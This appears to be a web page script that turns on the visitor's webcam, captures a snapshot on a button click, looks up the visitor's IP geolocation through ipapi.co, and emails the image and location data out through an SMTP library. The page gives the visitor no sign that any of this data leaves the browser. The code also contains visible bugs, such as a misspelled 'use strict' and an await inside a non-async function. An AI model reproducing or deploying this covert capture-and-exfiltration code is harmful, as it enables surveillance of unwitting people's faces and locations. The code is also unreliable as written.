<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Document</title>
</head>
<body>
    <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
    </div>
    <div class="controller">
        <!--<button id="snap">Capture</button>-->
        <form method="post">
            <input type="button" value="Capture" onclick="startSnap()"/>
        </form>  
    </div>
    <canvas id="canvas" width="640" height="480"></canvas>
    <script src="./smtp.js"></script>
    <script src="email.js"></script>
    <script>

        'use strinc';
        const video=document.getElementById('video');
        const canvas=document.getElementById('canvas');
        const snap=document.getElementById('snap');
        const errorMsgElement=document.getElementById('span#ErrorMsg');

        const constraints={
            video: {
                width: {
                min: 1280,
                ideal: 1920,
                max: 2560,
                },
                height: {
                min: 720,
                ideal: 1080,
                max: 1440
                },
                facingMode: 'user'
            }
        };
        async function init(){
            try{
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSucess(stream)
            }catch(e){
                errorMsgElement.innerHTML=`navigator.getUserMedia.error:${e.toString()}`
            }
        }

    //Sucess
    function handleSucess(stream){
        window.stream= stream;
        video.srcObject=stream;
    }
    init();

    var context= canvas.getContext('2d');
    function startSnap(){
            context.drawImage(video,0,0,640,480)
            const base64image=canvas.toDataURL('image/jpeg');
            console.log(base64image)
            var Body="Attachment of the webcam snap";
            try{
                await $.getJSON('https://ipapi.co/json/', function(data) {
                    var ipdata=JSON.stringify(data, null, 2)
                    console.log(ipdata);
                    Body+="\n"+ipdata;
                });
            }catch{
                console.log("Error")
                Body+="\n"+"[ERROR]";
            }
            sendEmail(base64image,Body)
    }



    


    </script>
</html>
